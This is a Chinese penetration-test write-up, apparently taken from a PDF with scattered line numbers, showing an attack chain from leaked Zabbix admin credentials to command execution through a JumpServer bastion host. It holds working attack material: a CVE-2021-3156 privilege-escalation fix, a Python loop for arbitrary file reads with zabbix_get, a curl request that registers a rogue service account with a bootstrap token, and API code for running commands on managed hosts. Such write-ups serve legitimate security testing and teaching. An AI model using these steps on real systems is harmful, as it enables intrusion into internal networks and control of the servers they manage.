记⼀次渗透测试中的攻击路径，本⽂只对从zabbix权限到拿下内⽹jumpserver堡垒机权限的过
程进⾏介绍。
0x01 获取zabbix权限
内⽹扫描，发现了⼀个⾃研的资产监控平台，通过Django进⾏开发，且开了debug模式，在报
错的信息中，成功泄露了zabbix服务器和账号密码。
通过该zabbix账号密码，成功进⼊到zabbix的后台，且当前⽤户为管理员权限。
对zabbix系统上监控的主机进⾏观察，发现jumpserver服务器在zabbix监控主机中。想到wfox
关于zabbix权限利⽤的⽂章http://noahblog.360.cn/zabbixgong-ji-mian-wa-jue-yu-li-
yong/，可以利⽤zabbix读jumpserver服务器的⽂件。
0x02 获取zabbix server权限
⾸先添加zabbix脚本，在创建脚本的时候选择zabbix服务器
然后在监测-》最新数据下⾯筛选zabbix server，并下发脚本执⾏命令，成功获取zabbix服务
器权限。
在zabbix server上尝试利⽤zabbix_get命令读取⽂件，但是出现如下错误：
通过查阅资料且重新看了⼀下zabbix server的配置后发现，jumpserver是通过zabbix proxy进
⾏数据上报，所以只能在jumpserver对应上报数据的zabbix proxy服务器上使⽤zabbix_get，
还有⼀种⽅法是wfox⽂章中的第6点，通过添加监控项进⾏⽂件读取。实际渗透过程中没有注
意到这个，⽽是通过拿下了zabbix proxy服务器权限来读取的。
0x03 获取zabbix proxy服务器权限
在获取了zabbix server服务器权限后，由于不能直接使⽤zabbix_get命令进⾏读⽂件，于是尝
试对zabbix server进⾏提权，使⽤https://github.com/worawit/CVE-2021-3156项⽬进⾏提
权（⾮常好⽤），服务器是centos，sudo版本为1.8.19p2，
直接使⽤exploit_defaults_mailer.py这个脚本进⾏提权，但是这个脚本在获取sudo版本的时候
有⼀些bug，需要⼿动修改⼀下第141⾏为当前sudo的版本：
sudo_vers = [1, 8, 19] # get_sudo_version() 
1
提权成功：
提权成功后，对主机进⾏信息收集，发现了⼀个数据库账号密码（user01/password），且同
时发现服务器上存在user01⽤户，于是尝试⽤（user01/password）进⾏SSH爆破，很幸运，
成功拿下了zabbix proxy服务器的权限。
0x04 zabbix任意⽂件读取（图⽚为本地环境测试）
在zabbix proxy服务器上，成功利⽤zabbix_get读取到了jumpserver服务器⽂件
于是思考如何利⽤zabbix任意⽂件读去获取jumpserver服务器权限，⾸先尝试读取jumpserver
的配置⽂件，默认位置是：/opt/jumpserver/config/config.txt
jumpserver未对⽬录进⾏权限限制，可以读取到jumpserver的配置⽂件信息，但是jumpserver
默认是使⽤docker构建，且数据库和redis都没有映射出来，所以读取出来的redis和数据库账
号密码没办法直接利⽤。
于是本地搭建jumpserver环境，⾸先了解了/opt/jumpserver⽬录下的⽬录结构，⼜根据之前
jumpserver的⽇志⽂件泄露漏洞，想通过读取⽇志⽂件信息，进⽽获取jumpserver服务器权
限，默认的⽇志⽂件路径为：/opt/jumpserver/core/logs/jumpserver.log
但是zabbix_get读取⽂件内容存在限制，仅能读取⼩于64KB⼤⼩的⽂件，
翻了⼀下zabbix关于利⽤vfs.file.contents读⽂件的⽂档：
https://www.zabbix.com/documentation/4.0/en/manual/config/items/itemtypes/zabbix
_agent，发现除了vfs.file.contents外，还有⼀个vfs.file.regexp操作，⼤概的意思就是输出特
定正则匹配的某⼀⾏，然后可以指定从开始和结束的⾏号。
于是利⽤该⽅法写了⼀个简单的任意读⽂件的脚本（还不够完善）：
from future import print_function 
import subprocess 
target = "192.168.21.166" 
file = "/opt/jumpserver/core/logs/jumpserver.log" 
1
2
3
4
5
6
for i in range(1, 2000): 
    cmd = 'vfs.file.regexp[{file},".*",,{start},{end},]'.format(file=file,
 start=i, end=i+1) 
    p = subprocess.Popen(["zabbix_get", "-s", target, "-k", cmd], stdout=su
bprocess.PIPE) 
    result, error = p.communicate() 
    print(result, end="") 
7
8
9
10
11
成功任意读取⽂件：
通过读取配置⽂件，尝试使⽤https://paper.seebug.org/1502/⽂章说的⽅法⽆果，且⽂章中
利⽤到的如下两个未授权接⼝，从jumpserver 2.6.2版本也被修复
/api/v1/authentication/connection-token/ 
/api/v1/users/connection-token/ 
1
2
于是尝试读取redis的dump⽂件，想通过redis获取缓存中的session，读了很久但是没有读取
到，不知道是缓存中没有session还是其他原因。
还尝试通过读取数据库⽂件（/opt/jumpserver/mysql/data/jumpserver/）去获取配置信息，
但是数据库⽂件权限不够，没办法读。
0x05 jumpserver服务账号利⽤
在读取的jumpserver配置⽂件中，发现了jumpserver的两个配置项SECRET_KEY和
BOOTSTRAP_TOKEN
SECRET_KEY⽐较熟悉，是Django框架中的配置，BOOTSTRAP_TOKEN这个⽐较奇怪，对
jumpserver源码进⾏分析，发现BOOTSTRAP_TOKEN是jumpserver中注册服务账号时⽤来认
证的。
参考jumpserver的官⽅⽂档，https://docs.jumpserver.org/zh/master/dev/build，
jumpserver的架构如下
jumpserver由多个服务组成，核⼼是core组件，还包括luna（JumpServer Web Terminal 前
端）、lina（前端 UI）、koko（JumpServer 字符协议资产连接组件，⽀持 SSH, Telnet, 
MySQL, Kubernets, SFTP, SQL Server）、lion（JumpServer 图形协议资产连接组件，⽀持 
RDP, VNC）组件，各个组件与core之间通过API进⾏调⽤。
各个组件与core之间的API调⽤是通过AccessKey进⾏认证鉴权，AccessKey在服务启动时通
过BOOTSTRAP_TOKEN向core模块注册服务账号来获取的，下⾯是koko模块注册的代码
（https://github.com/jumpserver/koko/blob/00cee388993ee6e92889df24aa033d09ce1
32fc5/pkg/koko/koko.go）
调⽤ MustLoadValidAccessKey ⽅法返回AccessKey，
从⽂件中获取，如果没有则调⽤ MustRegisterTerminalAccount ⽅法，这个⽂件的位置
在：/opt/jumpserver/koko/data/keys/.access_key
注册TerminalAccount的流程如下：
实际注册服务账号的⽅法如下
请求 /api/v1/terminal/terminal-registrations/ 接⼝，并在 Authorization 头中带上
BootstrapToken 即可。
请求接⼝
curl http:192.168.21.166/api/v1/terminal/terminal-registrations/ -H "Auth
orization: BootstrapToken M0ZDNTRENTYtODA4OS1DRTA0" data "name=test&comme
nt=koko&type=koko" 
1
会给你⼀个access key
或者也可以直接通过读取/opt/jumpserver/koko/data/keys/.access_key⽂件来获取access 
key。
access key利⽤
有了access key后，就可以通过jumpserver的API进⾏利⽤，下⾯是通过jumpserver ops运维
接⼝执⾏命令。
1.
⾸先通过 /api/v1/assets/assets/?offset=0&limit=15&display=1&draw=1  接⼝找到想
要执⾏命令的主机
def get_assets_assets(jms_url, auth): 
    url = jms_url + '/api/v1/assets/assets/?offset=0&limit=15&display=1&dra
w=1' 
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT' 
    headers = { 
        'Accept': 'application/json', 
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002', 
        'Date': datetime.datetime.utcnow().strftime(gmt_form) 
    } 
    response = requests.get(url, auth=auth, headers=headers) 
    print(response.text) 
1
2
3
4
5
6
7
8
9
10
11
这⾥需要记住主机的资产ID，和admin_user的内容。
2.
然后利⽤ api/v1/ops/command-executions 接⼝对指定主机执⾏命令
代码如下，修改data中的主机和run_as内容为第⼀步找到的id和admin_user，command为需
要执⾏的命令。
def get_ops_command_executions(jms_url, auth): 
    url = jms_url + '/api/v1/ops/command-executions/' 
    gmt_form = '%a, %d %b %Y %H:%M:%S GMT' 
    headers = { 
        'Accept': 'application/json', 
        'X-JMS-ORG': '00000000-0000-0000-0000-000000000002', 
1
2
3
4
5
6
        'Date': datetime.datetime.utcnow().strftime(gmt_form) 
    } 
    data = {"hosts":["fdfafb91-7b0a-425a-b250-56599bfc761b"],"run_as":"9733
20fd-6f06-4f59-8758-8ee52b6f7283","command":"whoami"} 
    response = requests.post(url, auth=auth, headers=headers, data=data) 
    print(response.text) 
7